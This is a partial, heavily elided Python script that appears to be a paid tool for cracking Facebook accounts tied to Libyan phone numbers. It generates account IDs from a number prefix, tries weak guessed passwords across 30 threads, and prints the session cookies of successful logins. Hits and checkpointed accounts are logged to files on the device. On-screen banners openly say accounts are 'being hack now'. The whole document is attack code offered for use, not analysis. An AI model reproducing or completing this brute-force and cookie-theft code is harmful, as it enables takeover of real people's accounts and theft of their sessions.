...
def xyz():
    ...
    print('           \x1b[97m[\033[37;41m  𝗶𝗺 𝗮𝗻𝗮𝗻𝘆   \033[0;m] ')
    print(f"")
    print(f"{BLUE}↳ {GREEN}Press a number 𝟏 ")
    print(f"")
   # print(f"\033[1;91m")
    LUQMAN = input("↳ put : ")
    if LUQMAN in ["1","01"]:
...
def Tabii():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m 💀ДПДПЧ💀  \033[0;m]")
    print(f"")
    print(f"        \x1b[97m[\033[95;42mTheThis is a paid tool $ :💀🔥\033[0;m]")
    print(f"")
    print('\033[0;97m Libyan code 🔽✅ \033')
    ...
    print(f"")
    code = input('Enter the code of your choice :\033[0;97m ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f" \x1b[97m[\033[37;41m Maximum is 🔥5000🔥 \033[0;m]")
    print(f"")
    limit = int(input(' \033[0;97m codes here :\033[0;96m 1000, 2000, 5000,\n\n \033[0;97m These codes✅  \033[0;96m'))
    ...
    with ThreadPool(max_workers=30) as yaari:    
        clear()
        tl = str(len(user))
        print(f" {BLUE}ⵌnumber of accountsⵌ  : {GREEN}"+tl)
        print(f" {BLUE}ⵌZIP codeⵌ            : {GREEN}Libya  ")
        print(f" {BLUE}ⵌThe number you putⵌ  : {GREEN}"+code)
        print(f" {BLUE}✅Account being hack now✅")
        print(f'{GREEN}▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩▩')
        for love in user:
            uid = code+love
            pwx = [love,]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                os.system("play-audio dapet.mp3")
                print('     \033[1;32m[Successful hunting✅] '+uid+' | '+ps+
'\n\033[1;37mkokis🔥 :\033[1;34m'+coki+'\033[0;97m')
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print('     \033[1;33m[Failed catch❌] '+uid+' | '+ps+'\033[0;97m')
                open('/sdcard/ANANY-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/ANANY-2F.txt', 'a').write(uid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[ANANY] [%s] \33[1;97m[OK:- %s CP:- %s]\r'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
